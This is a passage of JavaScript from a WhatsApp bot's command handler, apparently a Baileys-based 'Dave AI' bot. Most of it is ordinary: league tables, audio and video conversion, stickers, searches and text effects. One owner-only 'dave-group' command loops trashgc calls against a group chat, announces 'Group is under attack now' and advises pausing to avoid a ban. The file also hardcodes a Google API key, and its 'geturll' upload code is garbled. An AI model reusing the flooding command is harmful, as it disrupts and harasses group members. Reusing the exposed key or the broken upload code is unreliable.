     ], },},
    }, }, },{ quoted : fkontak });
await dave.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//      
        case "epl": case "epl-table": {

try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PL');
        const standings = data.data;

        const message = ` 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗘𝗽𝗹 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗘𝗽𝗹 standings.');
    }

 }
        break;

//========================================================================================================================//
              case "laliga": case "pd-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PD');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗮𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗟𝗮𝗹𝗶𝗴𝗮 standings.');
  }
}   
break;

//========================================================================================================================//
              case "bundesliga": case "bl-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/BL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 standings.');
    }
}
break;

//========================================================================================================================//
              case "ligue-1": case "lg-1": {
  try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/FL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗶𝗴𝘂𝗲-1 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗹𝗶𝗴𝘂𝗲-1 standings.');
    }
}
break;

//========================================================================================================================//
              case "serie-a": case "sa-table":{
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/SA');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗦𝗲𝗿𝗶𝗲-𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗦𝗲𝗿𝗶𝗲-𝗮 standings.');
    }
}
break;
//==================================================//
case 'obfuscate':
case 'obf':
case 'enc':
case 'encrypt': {
    const JsConfuser = require('js-confuser')

    // Better message checking
    if (!m.quoted) {
        return reply('❌ Please reply to a JavaScript file to encrypt.');
    }
    
    const quotedMessage = m.quoted.message;
    if (!quotedMessage?.documentMessage) {
        return reply('❌ Please reply to a document file.');
    }
    
    const quotedDocument = quotedMessage.documentMessage;
    if (!quotedDocument.fileName?.endsWith('.js')) {
        return reply('❌ Please reply to a JavaScript file (.js extension).');
    }
    
    try {
        const fileName = quotedDocument.fileName;
        
        // Send reaction to show processing
        await dave.sendMessage(m.chat, {
            react: { text: '🕛', key: m.key }
        });
        
        // Download the file
        const docBuffer = await m.quoted.download();
        if (!docBuffer || docBuffer.length === 0) {
            return reply('❌ Failed to download the file. Please try again.');
        }

        // Convert buffer to string and obfuscate
        const fileContent = docBuffer.toString('utf8');
        if (!fileContent.trim()) {
            return reply('❌ The file appears to be empty.');
        }

        const obfuscatedCode = await JsConfuser.obfuscate(fileContent, {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,
            identifierGenerator: function () {
                const originalString = "素GIFTED晴DAVE晴" + "素GIFTED晴DAVE晴";
                const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
                const randomString = (length) => {
                    let result = "";
                    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                    return result;
                };
                return removeUnwantedChars(originalString) + randomString(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.0,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,
            shuffle: { hash: 0.0, true: 0.0 },
            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 0.9,
            deadCode: 0.0,
            dispatcher: true,
            rgf: false,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
        });

        // Send the obfuscated file
        await dave.sendMessage(m.chat, {
            document: Buffer.from(obfuscatedCode, 'utf-8'),
            mimetype: 'application/javascript',
            fileName: `encrypted_${fileName}`,
            caption: `✅ Successfully Encrypted\n📁 Type: Hard Code Obfuscation\n👤 By: Dave AI`,
        }, { quoted: m }); // Changed from fkontak to m for proper quoting

    } catch (err) {
        console.error('Error during encryption:', err);
        await reply(`❌ An error occurred: ${err.message}`); // Fixed: err.message instead of error.message
    }
}
break;
  //==================================================//   

          
case 'readmore':
case 'readall': {
  if (!q) return reply(`Enter text like ${command} youarebad|justkidding`)
  let [l, r] = text.split`|`
  if (!l) l = ''
  if (!r) r = ''
  reply(l + readmore + r)
}
break

case 'tomp3': 
case 'tovn':
case 'toaudio': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const { tmpdir } = require('os');
    const path = require('path');

    // ✅ Get the media message
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const msg = (quotedMsg && (quotedMsg.videoMessage || quotedMsg.audioMessage)) 
                || m.message?.videoMessage 
                || m.message?.audioMessage;

    if (!msg) return reply("🎧 Reply to a *video* or *audio* to convert it to audio!");

    const mime = msg.mimetype || '';
    if (!/video|audio/.test(mime)) return reply("⚠️ Only works on *video* or *audio* messages!");

    reply("🎶 Converting to audio...");

    // ✅ Download media
    const stream = await downloadContentFromMessage(msg, mime.split("/")[0]);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    // ✅ Temp paths
    const inputPath = path.join(tmpdir(), `input_${Date.now()}.mp4`);
    const outputPath = path.join(tmpdir(), `output_${Date.now()}.mp3`);
    fs.writeFileSync(inputPath, buffer);

    // ✅ Convert using ffmpeg
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .toFormat('mp3')
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath);
    });

    // ✅ Send converted audio
    const audioBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });

    // ✅ Cleanup
    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

    reply("✅ Conversion complete!");
  } catch (err) {
    console.error("❌ toaudio error:", err);
    reply("💥 Failed to convert media to audio. Ensure it's a valid video/audio file.");
  }
}
break;


case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {
  if (!text) return reply('Enter watermark text!')
  if (!/image|video/gi.test(mime)) return m.reply('Send media first')
  if (/video/gi.test(mime) && qmsg.seconds > 15)
    return m.reply('Video duration must be less than 15 seconds!')
  var image = await dave.downloadAndSaveMediaMessage(qmsg)
  await dave.sendImageAsSticker(m.chat, image, m, { packname: text })
  await fs.unlinkSync(image)
  dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break




case 'smeme':
case 'stickermeme':
case 'stickmeme': {
  await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })
  if (!/webp/.test(mime) && /image/.test(mime)) {
    if (!text) return m.reply(`Usage: ${prefix + command} text1|text2`)
    let atas = text.split('|')[0] ? text.split('|')[0] : '-'
    let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let mee = await dave.downloadAndSaveMediaMessage(quoted)
    let mem = await UploadFileUgu(mee)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
    await dave.sendImageAsSticker(m.chat, meme, m, {
      packname: global.packname,
      author: global.author
    })
  } else {
    m.reply(`Send/Reply an image with caption ${prefix + command} text1|text2`)
  }
}
break


//=================== 📸 MEDIA UPLOADERS ===================//

// Upload to CatBox (supports images, videos, and documents)
case "tourl2": {
  if (!mime) return reply(`🎥 *Send/Reply Video/Image with caption* ${prefix + command}`);

  try {
    const fs = require("fs");
    const { CatBox } = require("@xct007/frieren-scraper");
    const qmsg = m.quoted ? m.quoted : m;

    const mediaPath = await dave.downloadAndSaveMediaMessage(qmsg);
    const response = await CatBox(mediaPath);
    const stats = fs.statSync(mediaPath);

    const fileSize = (stats.size / 1024).toFixed(2);
    const uploadDate = new Date().toLocaleString();
    const uploader = m.pushName || "Unknown";

    const caption =
      `🔗 *Media Link:* ${response}\n` +
      `📅 *Upload Date:* ${uploadDate}\n` +
      `📂 *File Size:* ${fileSize} KB\n` +
      `👤 *Uploader:* ${uploader}`;

    reply(caption);
    console.log(`[TOURL2] Uploaded media successfully → ${response}`);

    await fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error("[TOURL2 ERROR]", err.message);
    reply("❌ *Error while uploading media.* Please try again.");
  }
}
break;

case 'hdvideo':
case 'hdvid': {
  const ffmpeg = require('fluent-ffmpeg')
  const ffmpegStatic = require('ffmpeg-static')
  const { writeFile, unlink, mkdir } = require('fs').promises
  const { existsSync } = require('fs')
  const path = require('path')

  if (!ffmpegStatic) {
    return dave.sendMessage(m.chat, { text: '❌ FFMPEG not found!' }, { quoted: m })
  }
  ffmpeg.setFfmpegPath(ffmpegStatic)
  let inputPath, outputPath
  try {
    let q = m.quoted || m
    let mime = q.mimetype || q.msg?.mimetype || q.mediaType || ''
    if (!mime) return dave.sendMessage(m.chat, { text: 'Where is the video?' }, { quoted: m })
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return dave.sendMessage(m.chat, { text: `❌ Format ${mime} not supported!` }, { quoted: m })
    }
    dave.sendMessage(m.chat, { text: '⏳ Processing video, please wait 2-4 minutes...' }, { quoted: m })
    let videoBuffer = await q.download?.()
    if (!videoBuffer) return dave.sendMessage(m.chat, { text: '❌ Failed to download video!' }, { quoted: m })
    let tempDir = path.join(__dirname, 'tmp')
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true })
    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`)
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`)
    await writeFile(inputPath, videoBuffer)
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
          '-r', '60',
          '-preset', 'faster',
          '-crf', '25',
          '-c:v', 'libx264',
          '-pix_fmt', 'yuv420p',
          '-c:a', 'aac',
          '-b:a', '128k'
        ])
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath)
    })
    await dave.sendMessage(m.chat, {
      video: { url: outputPath },
      caption: 'Video quality enhanced successfully!'
    }, { quoted: m })
  } catch (err) {
    console.error('Error HD Video:', err)
    dave.sendMessage(m.chat, { text: 'Failed to enhance video quality.' }, { quoted: m })
  } finally {
    setTimeout(() => {
      if (inputPath) unlink(inputPath).catch(() => {})
      if (outputPath) unlink(outputPath).catch(() => {})
    }, 5000)
  }
}
break

case 'hd':
case 'tohd':
case 'remini': {
  if (!quoted) return reply('Where is the photo?')
  if (!/image/.test(mime)) return reply(`Send/Reply to a photo with caption ${prefix + command}`)
  await dave.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })

  await reply('Please wait, your process has started...\n\n⏳ This may take some time, please be patient.')

  let cap = `*Type:* SuperHD\n*Result:* Success`
  let media = await dave.downloadAndSaveMediaMessage(quoted)
  try {
    let catBoxUrl = await CatBox(media)
    let anjai = await fetchJson(`https://api.vreden.my.id/api/artificial/hdr?url=${catBoxUrl}&pixel=4`)
    let result = anjai.result.data.downloadUrls[0]
    dave.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
  } catch (error) {
    console.error(error)
    reply('❌ Error processing HD image.')
  }
}
break


        case "geturll": { 
  // Check if the message is a quoted image
  if (!m.quoted) return reply("❌ Reply to the image with /tourlpub");

  // Download the quoted image
  let q = await m.quoted.download();
  if (!q) return reply("❌ Failed to download");

  // Create a new FormData object and append the image
  const FormData = require("form-data"),
    axios = require("axios"),
    form = new FormData();
  form.append("key", "LutBotz.Tamvan.dan.ganteng.banget.sumpah");
  form.append("file", q, { filename: "wa.png", contentType: "image/png" });

  // Send a POST request to the upload URL
  const r = await axios.post("https:")                                                                                      
  const z = r.data;


  if (!z.success) return reply("//rismajaya.my.id/tools/uploaders/uploads.php", form, { headers: form.getHeaders() });
  const d = r.data;

  // Check if the upload was successful
  if (!d.success) return reply("❌ " + d.error);

  // Send the public link
  await reply(`𝘿𝙖𝙫𝙚𝘼𝙄 urls\n\n${d.url}`);
}
break;



// 🔍 Anime Search
case 'animesearch': {
    if (!text) return reply(`Example usage: ${prefix + command} Solo Leveling`);

    try {
        reply('🔍 Searching for anime...');
        const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data?.status || !data.result || data.result.length === 0) {
            return reply('❌ No results found for that anime.');
        }

        let replyText = `🎌 *Anime Search Results* 🎌\n\n`;
        data.result.forEach((anime, index) => {
            replyText += `*${index + 1}. ${anime.title}*\n`;
            replyText += `├ Type: ${anime.type || 'Unknown'}\n`;
            replyText += `├ Status: ${anime.status || 'Unknown'}\n`;
            replyText += `└ Link: ${anime.link || 'N/A'}\n\n`;
        });

        const firstResult = data.result[0];
        await dave.sendMessage(
            m.chat,
            { image: { url: firstResult.image || '' }, caption: replyText },
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        reply('❌ Failed to search for anime. Try again later.');
    }
}
break;

// 🛒 Play Store Search
case 'playstore':
case 'pstore': {
    if (!text) return reply(`Example: ${prefix + command} WhatsApp`);
    try {
        let response = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${encodeURIComponent(text)}`);
        let results = response.result || [];

        if (!results.length) return reply('❌ No results found.');

        let image = results[0]?.img || '';
        let textResult = results.map((item, i) => {
            return `*${i + 1}. ${item.title.toUpperCase()}*\nDeveloper: ${item.developer || 'N/A'}\nRating: ${item.rate2 || 'N/A'}\nLink: ${item.link || 'N/A'}\nDeveloper Link: ${item.link_dev || 'N/A'}`;
        }).join('\n\n');

        await dave.sendMessage(
            m.chat,
            { image: { url: image }, caption: textResult },
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        reply('❌ Error fetching Play Store results.');
    }
}
break;

// 🎮 PlayStation Search
case 'playstation':
case 'pstation': {
    if (!text) return reply(`Example: ${prefix + command} Naruto`);
    try {
        let response = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${encodeURIComponent(text)}`);
        let results = response.result || [];
        if (!results.length) return reply('❌ No results found.');

        let image = results[0]?.images || '';
        let textResult = results.map((item, i) => `*${i + 1}. ${item.title.toUpperCase()}*\nLink: ${item.link || 'N/A'}`).join('\n\n');

        await dave.sendMessage(
            m.chat,
            { image: { url: image }, caption: textResult },
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        reply('Error fetching PlayStation results.');
    }
}
break;

// 🌐 Google Search
case 'google': {
    if (!text) return reply(`Example: ${prefix + command} Dave`);
    try {
        const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk';
        const cx = 'e5c2be9c3f94c4bbb';
        const url = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(text)}&key=${apiKey}&cx=${cx}`;
        
        const res = await fetch(url);
        const data = await res.json();

        if (!data.items || !data.items.length) return reply('❌ No results found.');

        let textResult = `🔎 *Google Search Results for:* ${text}\n\n`;
        data.items.forEach(item => {
            textResult += `• *Title:* ${item.title || 'N/A'}\n`;
            textResult += `• *Description:* ${item.snippet || 'N/A'}\n`;
            textResult += `• *Link:* ${item.link || 'N/A'}\n\n`;
        });

        reply(textResult);
    } catch (err) {
        console.error(err);
        reply('Error performing Google search.');
    }
}
break;

//==================================================//   
        case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await dave.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await dave.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break
//==================================================//           
        case 'dave-group': {
    if (!daveshown) return reply("This Feature Only Send By Bot Number");
if (!m.isGroup) return reply(mess.group)
    dave.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });

    //Paramater
    for (let r = 0; r < 15; r++) {

 await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            reply(`[ 🔥 ] Group is under attack now
 _*\`Status\`*_ : *SUCCESS  ATTACK 鉁�*
 _*\`Type\`*_ : _${command}_
> pause for five-ten minutes to avoid ban

`)   
}
break;

case 'checksettings': {
  try {
    const settings = global.settings

    // Count how many groups have each feature enabled
    const countEnabled = (obj) => {
      if (!obj || typeof obj !== 'object') return 0
      if (obj.enabled !== undefined) return obj.enabled ? 1 : 0
      return Object.values(obj).filter((v) => v && v.enabled).length
    }

    const summary = `
BOT SETTINGS STATUS

Anti Features:
Antilink: ${countEnabled(settings.antilink)} group(s)
Antilinkgc: ${countEnabled(settings.antilinkgc)} group(s)
Antitag: ${countEnabled(settings.antitag)} group(s)
Antibadword: ${countEnabled(settings.antibadword)} group(s)
Antipromote: ${countEnabled(settings.antipromote)} group(s)
Antidemote: ${countEnabled(settings.antidemote)} group(s)

Global Presence Settings:
Autoread: ${settings.autoread.enabled ? 'ON' : 'OFF'}
Autotyping: ${settings.autotyping.enabled ? 'ON' : 'OFF'}
Autorecord: ${settings.autorecord.enabled ? 'ON' : 'OFF'}
Autoviewstatus: ${settings.autoviewstatus ? 'ON' : 'OFF'}
Areact: ${settings.areact.enabled ? 'ON' : 'OFF'}

Group Features:
Welcome: ${settings.welcome ? 'ON' : 'OFF'}
Goodbye: ${settings.goodbye ? 'ON' : 'OFF'}
Anticall: ${settings.anticall ? 'ON' : 'OFF'}

Settings File: library/database/settings.json
Last updated: ${new Date().toLocaleString()}
`

    reply(summary.trim())
  } catch (err) {
    console.error('CheckSettings Error:', err)
    reply('Error while checking bot settings')
  }
}
break

case 'private':
case 'self': {
    if (!daveshown) return reply(mess.owner)

    const settings = global.settings
    settings.public = false
    global.saveSettings(settings)
    global.settings = settings

    reply("Bot switched to private mode. Only the owner can use commands now")
}
break

case 'public': {
    if (!daveshown) return reply(mess.owner)

    const settings = global.settings
    settings.public = true
    global.saveSettings(settings)
    global.settings = settings

    reply("Bot switched to public mode. Everyone can use commands now")
}
break
//==================================================//     
        case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//         
        case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//   
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
dave.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//==================================================//        
        case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
